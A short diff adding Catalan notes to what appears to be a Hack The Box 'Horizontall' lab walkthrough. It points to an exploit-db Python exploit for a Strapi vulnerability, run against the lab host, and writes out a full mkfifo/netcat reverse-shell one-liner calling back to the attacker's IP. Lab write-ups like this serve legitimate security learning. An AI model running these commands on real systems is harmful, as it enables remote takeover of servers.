@@ -19,4 +19,12 @@ Wappalyzer diu:
 
 nginx 1.14.0
 
+COPIEM L'SCRIPT EN PYTHON QUE UTILITZA UNA VULNERAVILITAT DE strapi
 
+https://www.exploit-db.com/exploits/50239
+
+python script.py http://api-prod.horizontall.htb/
+
+COMANDA PER OBRIR UN TERMINAL REMOT CAP AL NOSTRE HOST:
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.18 3535 >/tmp/f
